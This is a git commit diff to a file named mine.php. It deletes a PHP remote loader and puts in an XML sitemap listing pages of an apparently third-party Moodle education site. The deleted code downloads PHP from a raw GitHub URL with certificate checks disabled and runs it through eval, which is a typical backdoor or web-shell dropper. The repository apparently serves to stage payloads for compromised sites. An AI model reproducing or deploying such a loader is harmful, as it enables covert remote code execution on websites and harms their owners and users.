add298291e6cf8e59488d8dfa4d748cf3936e249
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-07-22 12:55:22 +0700

    Update mine.php

--- mine.php
+++ mine.php
@@ -1,21 +1,52 @@
-<?php
-function getURL($url) {
-    if (function_exists('curl_version')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-    return false;
-}
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset
+      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
+            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<!-- created with Free Online Sitemap Generator www.xml-sitemaps.com -->
 
-// Contoh penggunaan:
-$phpCode = getURL('https://raw.githubusercontent.com/eagles227/claudia/main/wp-output.php');
-if ($phpCode !== false) {
-    eval("?>". $phpCode);
-}
-?>
+
+<url>
+  <loc>https://odel.kisot.ac.ke/</loc>
+  <lastmod>2025-07-22T05:53:44+00:00</lastmod>
+  <priority>1.00</priority>
+</url>
+<url>
+  <loc>https://odel.kisot.ac.ke/login/forgot_password.php</loc>
+  <lastmod>2025-07-22T05:53:58+00:00</lastmod>
+  <priority>0.80</priority>
+</url>
+<url>
+  <loc>https://odel.kisot.ac.ke/course/index.php?categoryid=1</loc>
+  <lastmod>2025-07-22T05:53:58+00:00</lastmod>
+  <priority>0.80</priority>
+</url>
+<url>
+  <loc>https://odel.kisot.ac.ke/course/index.php?categoryid=2</loc>
+  <lastmod>2025-07-22T05:53:58+00:00</lastmod>
+  <priority>0.80</priority>
+</url>
+<url>
+  <loc>https://odel.kisot.ac.ke/course/index.php</loc>
+  <lastmod>2025-07-22T05:53:58+00:00</lastmod>
+  <priority>0.80</priority>
+</url>
+<url>
+  <loc>https://odel.kisot.ac.ke/admin/tool/dataprivacy/summary.php</loc>
+  <lastmod>2025-07-22T05:53:58+00:00</lastmod>
+  <priority>0.80</priority>
+</url>
+<url>
+  <loc>https://odel.kisot.ac.ke/course/index.php?categoryid=3</loc>
+  <lastmod>2025-07-22T05:53:58+00:00</lastmod>
+  <priority>0.64</priority>
+</url>
+<url>
+  <loc>https://odel.kisot.ac.ke/course/index.php?categoryid=4</loc>
+  <lastmod>2025-07-22T05:53:58+00:00</lastmod>
+  <priority>0.64</priority>
+</url>
+
+
+</urlset>
